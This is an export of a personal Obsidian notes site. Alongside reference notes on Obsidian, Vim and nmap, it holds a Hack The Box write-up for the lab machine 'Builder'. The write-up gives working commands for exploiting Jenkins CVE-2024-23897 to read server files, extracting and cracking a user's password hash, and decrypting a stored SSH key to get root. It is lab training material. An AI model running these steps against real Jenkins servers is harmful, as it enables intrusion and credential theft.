{"010-Cyber":{"title":"010 Cyber","links":["everything/Cyber/011---HTB"],"tags":["cyber"],"content":"MOCs\n\n011 - HTB\n"},"020-Undergrad---Champlain":{"title":"020 Undergrad - Champlain","links":[],"tags":["undergrad","champlain"],"content":"MOCs\nSenior\nSP24\nFA23\nJunior\nSP23\nFA22\nSophomore\nSP22\nFA21\nFreshman\nSP21\nFA20"},"100-References":{"title":"100 References","links":["everything/Refernces/Obsidian","everything/Refernces/Vim","everything/Refernces/Kitty","everything/Refernces/NMAP"],"tags":["ref"],"content":"MOCs\nSoftware Refernces\n\nObsidian\nVim\nKitty\nNMAP\n"},"Dashboard":{"title":"Dashboard","links":["010-Cyber","020-Undergrad---Champlain","100-References"],"tags":["dashboard"],"content":"HELLO!\nMOCs\n\n010 Cyber\n020 Undergrad - Champlain\n100 References\n"},"everything/Cyber/011---HTB":{"title":"011 - HTB","links":["everything/Cyber/htb-codify","tags/active","everything/Cyber/htb-perfection","everything/Cyber/htb-builder","tags/retired"],"tags":["htb","active","retired"],"content":"MOCs\n\n\n                  \n                  Active Boxes \n                  \n                \nActive HTB boxes will not be published but will be shown on this list as they’re retired they will become index able pages.\n\nIncomplete Boxes\n\n\n                  \n                  Dataview \n                  \n                \nDataview only works in my obsidian due to plugins it automatically will query for pages fitting the requirements below\n\nTABLE file.name as Filename, file.ctime as Created \nFROM #htb/incomplete and !#htb/shelved \nWHERE file.name != &quot;htb-js&quot; \nSORT file.ctime ASC\nCompleted Boxes\n\nhtb-codify -active\nhtb-perfection -active\nhtb-builder -retired\n\nTABLE file.name as Filename, file.ctime as Created, Completed \nFROM #htb/complete and !#htb/shelved \nWHERE file.name != &quot;htb-js&quot; \nSORT file.ctime ASC\nRetired Completed Boxes\nTABLE file.name as Filename, file.ctime as Created, Completed \nFROM #htb/complete and !#htb/shelved \nWHERE file.name != &quot;htb-js&quot; AND public = true\nSORT file.ctime ASC"},"everything/Cyber/htb-builder":{"title":"htb-builder","links":["tags/htb/complete"],"tags":["htb/os/linux","htb/box/medium","htb/complete"],"content":"builder\n\nDifficulty: Medium\nOS: Linux\nDate: 2024-03-07\nCompleted:complete\n\nEnumeration\nThe target is listening on only ports 22 and 8080. The service which is running on 8080 is Jenkins (10.0.18)\nsudo nmap -p- --min-rate 10000 -oA scans/tcp_allports builder.htb\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n...\nsudo nmap -p 22,8080 -sC -sV -oA scans/tcp_scripts builder.htb\n...\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n8080/tcp open  http    Jetty 10.0.18\n|_http-title: Dashboard [Jenkins]\n| http-robots.txt: 1 disallowed entry \n|_/\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Jetty(10.0.18)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n...\nThere are no hidden files or VHOSTs, etc., just the Jenkins page.\nFoothold\nThe CVE used to exploit Jenkins CLI CVE-2024-23897\nFor the Jenkins version running the jenkins-cli can be exploited by downloading the jenkins-cli.jar off the website then using that to get a foothold.\nDownload jenkins-cli\nDownload:\nwget builder.htb:8080/jnlpJars/jenkins-cli.jar\nUsage:\njava -jar jenkins-cli.jar -s &#039;http://10.10.11.10:8080&#039; help\nGet Commands list\nGet all help command: The sed is looking for 2 spaces and to remove them.\njava -jar jenkins-cli.jar -s builder.htb:8080 help 2&gt;&amp;1 | sed -n &#039;/[A-Z]/!s/  *//gp&#039;\nadd-job-to-view\nbuild\ncancel-quiet-down\nclear-queue\nconnect-node\nconsole\ncopy-job\ncreate-credentials-by-xml\n...\nExecute Command list\nhead commands.txt | xargs -I {} sh -c &quot;java -jar jenkins-cli.jar -s builder.htb:8080 &#039;{}&#039; @/etc/passwd &gt; &#039;cmd/{}.out&#039; 2&gt;&amp;1&quot;\nThe command with the largest output was the connect-node command:\nfind cmd | xargs wc -l | sort -nr | head\nwc: cmd: Is a directory\n     63 total\n     22 cmd/connect-node.out\n      7 cmd/create-credentials-by-xml.out\n      6 cmd/create-job.out\n      6 cmd/create-credentials-domain-by-xml.out\n      5 cmd/clear-queue.out\n      5 cmd/cancel-quiet-down.out\n      3 cmd/copy-job.out\n      3 cmd/console.out\n      3 cmd/build.out\nGetting Access to user\nThe users.xml was found my looking through the Jenkins documentation page and I can across this resource which details that the users information had been migrated to /users/users.xml below you can see the output of going to that file. For getting the actual user information I was about to find this security update which details how the user migration was taking place for upgrading to Jenkins LTS 2.138.x. It shows that “In this case, rename the directory $JENKINS_HOME/users/admin_6635238516816951048/” which is how I was about to find jennifers hash.\nJenkins stores its users in /var/jenkins_home/users/users.xml this is where I found jennifer_12108429903186576833\njava -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/users.xml\n...\n&lt;?xml version=&#039;1.1&#039; encoding=&#039;UTF-8&#039;?&gt;: No such agent &quot;&lt;?xml version=&#039;1.1&#039; encoding=&#039;UTF-8&#039;?&gt;&quot; exists.\n      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;: No such agent &quot;      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;&quot; exists.\n  &lt;idToDirectoryNameMap class=&quot;concurrent-hash-map&quot;&gt;: No such agent &quot;  &lt;idToDirectoryNameMap class=&quot;concurrent-hash-map&quot;&gt;&quot; exists.\n    &lt;entry&gt;: No such agent &quot;    &lt;entry&gt;&quot; exists.\n      &lt;string&gt;jennifer&lt;/string&gt;: No such agent &quot;      &lt;string&gt;jennifer&lt;/string&gt;&quot; exists.\n  &lt;version&gt;1&lt;/version&gt;: No such agent &quot;  &lt;version&gt;1&lt;/version&gt;&quot; exists.\n&lt;/hudson.model.UserIdMapper&gt;: No such agent &quot;&lt;/hudson.model.UserIdMapper&gt;&quot; exists.\n  &lt;/idToDirectoryNameMap&gt;: No such agent &quot;  &lt;/idToDirectoryNameMap&gt;&quot; exists.\n&lt;hudson.model.UserIdMapper&gt;: No such agent &quot;&lt;hudson.model.UserIdMapper&gt;&quot; exists.\n    &lt;/entry&gt;: No such agent &quot;    &lt;/entry&gt;&quot; exists.\n...\nUsing jennifer_12108429903186576833 in the path for user configs /var/jenkins_home/users/jennifer_12108429903186576833/config.xml we find in this file at the end there is a password hash.\njava -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml\n...\n&lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;: No such agent &quot;      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;&quot; exists.\n...\nI took this has and made the file below:\ncat jennifer_hash\njennifer:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a\nThen I used the hashcat command. Which cracked the password which came out to princess. With this password I am about to log into the Jenkins webpage as Jennifer.\n$ hashcat -m 3200 jennifer_hash --user /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt\n...\n$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess\n...\nUser\nAfter logging into the Jenkins webpage I started digging around and came across the root user configuration. After trying to play with the update credentials I started digging in the html and was able to find:\n\nThe key will be pretty long:\n&lt;input name=&quot;_.privateKey&quot; type=&quot;hidden&quot; value=&quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&quot;&gt;&lt;/div&gt;\nFrom here going the /script and doing the following from here\nprintln( hudson.util.Secret.decrypt(&quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&quot;) )\nThis will output the private key:\n\nPrivilege Escalation\nFrom getting the ssh key we can copy the private key to host system and make a keyfile:\nkali@kali:~/htb$ vim builder-key\nkali@kali:~/htb$ chmod 600 builder-key\nkali@kali:~/htb$ ssh -i builder-key root@builder.htb\nroot@builder:~# ls\nroot.txt\nIf we look in the directory /home/jennifer we will find:\nroot@builder:~# ls -la /home/jennifer/\ntotal 28\ndrwxr-x--- 3 jennifer jennifer 4096 Feb  9 15:45 .\ndrwxr-xr-x 3 root     root     4096 Feb  9 15:45 ..\nlrwxrwxrwx 1 root     root        9 Feb  9 14:31 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 jennifer jennifer  220 Jan  6  2022 .bash_logout\n-rw-r--r-- 1 jennifer jennifer 3771 Jan  6  2022 .bashrc\ndrwx------ 2 jennifer jennifer 4096 Feb  9 15:45 .cache\n-rw-r--r-- 1 jennifer jennifer  807 Jan  6  2022 .profile\n-rw-r----- 1 root     jennifer   33 Mar  8 05:02 user.txt"},"everything/Refernces/Kitty":{"title":"Kitty","links":[],"tags":["software/terminal"],"content":"Kitty\nConfig\nCommands\nUsage\nKittens\n\nThis all copies term info files for kitty and magically enables shell integration\n\nkitten ssh user@ip\n"},"everything/Refernces/NMAP":{"title":"NMAP","links":[],"tags":["ref","software","cyber"],"content":"MOC\nUseful Commands\nsudo nmap -p- --min-rate 10000 -oA scans/tcp_allports IP\nsudo nmap -p PORT1,PORT2,... -sC -sV -oA scans/tcp_scripts IP\nCheat Sheet\nAll Arguements"},"everything/Refernces/Neovim":{"title":"Neovim","links":[],"tags":["software"],"content":""},"everything/Refernces/Obsidian":{"title":"Obsidian","links":["Mermaid"],"tags":["ref","software"],"content":"Terms:\n\nMOC = Map of Content\n\nObsidian Keybinds:\n\nctrl + e switch view\nctrl + shift + s live preview\nctrl + p Command pallet\nctrl + , Settings\nctrl + shift + o vault search\nctrl + n create new note\nctrl + ; add tags\nctrl + shift + m Move note\nalt + e put template over new note\nctrl + enter or click create new note from link\n\nCustom Keybinds\n\nToggle checkbox status: Ctrl + R\nTasks\n\nCreate new/edit: Ctrl + Y\nMark done: Ctrl + Shift + Y\n\n\nUnique note - create new note: Ctrl + Shift + N\n\nHad to unbind ‘New note to the right’\n\n\nObsidian Git - Create Backup: Ctrl + Shift + B\nWindow navigation\n\nSplit below: Ctrl + Shift + DownArrow\nSplit right: Ctrl + Shift + -&gt;\nFocus (up | down | left | right): Ctrl + (Up|Down|Left|Right)Arrow\n\n\nAuto Link Title\n\nPaste link and fetch title: Ctrl + Shift + V\nEnhance title of existing link: Ctrl + Shift + E\n\n\n\nAdditional Markdown Functionality\nMarkdown in obsidian has a number of additional features, some of which are detailed in other sections of this document. Any small syntax sugar/etc. that doesn’t fit within another category will be included under this header.\nHighlighting Text\nText in Obsidian can be highlighted, with the following syntax: \\==highlighted==.\nDiagrams with Mermaid\nMermaid diagrams can be embedded into an Obsidian document, within a code block with the mermaid language.\nExample Flowchart\nThis link has many Mermaid examples, one of which is displayed below, rendered by Obsidian:\nflowchart LR\n\nA[Hard] --&gt;|Text| B(Round)\nB --&gt; C{Decision}\nC --&gt;|One| D[Result 1]\nC --&gt;|Two| E[Result 2]\n\nWorking with Images\nMinimal Theme Filters\nWhen using the Minimal Theme, filters can be applied to images to modify their appearance (link).\n\nAdd with ![[image.jpg|#filter]]\n#invert - Invert images in dark mode (light ⇒ dark)\n#circle - Crop image to a circle\n#outline - Add outline around image\n\nAdjusting Size\nThe size of an image can be adjusted by including one or both dimensions in the image tag, like so:\nEmbed:\n![[image.jpg|100x100]]\n![[image.jpg|100]]  &lt;-- Scales based on aspect ratio\n \nLinked Image:\n\\![AltText|100x100](hxxp://link/to/image.jpg)\nCallouts\n\n\n                  \n                  Info\n                  \n                \nThe complete documentation on callouts can be found here.\n\nCallouts can be added to a note using the following syntax:\n&gt; [!TYPE] Title\n&gt; \n&gt; Conents of callout\n&gt; can be multiple lines\n\nThe Title is optional, and will be replaced with the callout type if absent.\nCallouts are optionally collapsible, defaulting to collapsed or expanded based on syntax.\n\n[!TYPE]- to start collapsed\n[!TYPE]+ to start expanded\n\n\n\nCallout Types\nThe following callout types are usable by default:\n\nnote\nabstract\n\nsummary, tldr\n\n\ninfo\ntodo\ntip\n\nhint, important\n\n\nsuccess\n\ncheck, done\n\n\nquestion\n\nhelp, faq\n\n\nwarning\n\ncaution, attention\n\n\nfailure\n\nfail, missing\n\n\ndanger\n\nerror\n\n\nbug\nexample\nquote\n\ncite\n\n\n\nLinks vs. Tags\nConceptual Uses for Each\n\nVia Obsidian forums\n\nA link points/directs to another file\nA tag marks a note, or a part of a note.\n\nHelpful for search filters and general grouping\n\n\n\n\nVia A Guide On Links vs. Tags\n\nLinks vs. Tags\n\nWhat Obsidian calls a link can be defined as: “A connection from one note to another note”.\nIn Obsidian, a tag is: “A connection from a note to an idea”.\n\n\nNodes\n\nEvery note in your vault is a “node”, as you see when you open the graph view.\nEvery tag is also a node, just with no file behind it\n\n\nThis concept is..\n\nUseful for: If you want to use tags in graph view to identify emergent concepts\n\nwhen enough notes share a #tag, the node gets real big in graph view\n\n\nNot useful for: If you also use tags for status or type (book, person, etc.) (ref).\n\n\n\n\n\nPlugins\nTemplater\nThe Templater plugin allows for embedded JavaScript to be executed when a template is inserted. These templates can also be evaluated in existing documents (Alt + R).\nInsert File Creation Date\n&lt;% tp.file.creation_date(&quot;YYYY-MM-DD&quot;) %&gt;\nPlugins to check out\n\nBreadcrumbs\n\nHierarchical links between notes\n\n\nAuto note mover - move notes based on rules (filename/tag)\n\nInstalled - to learn\n\nTag folders\n"},"everything/Refernces/Vim":{"title":"Vim","links":["everything/Refernces/Neovim","lazyvim"],"tags":["software","ref"],"content":"Sub Refernces\n\nNeovim\nlazyvim\n"},"index":{"title":"index","links":["Dashboard"],"tags":[],"content":"Welcome!\nIf you would like to access the rest of the site please go to Dashboard.\nDashboard"}}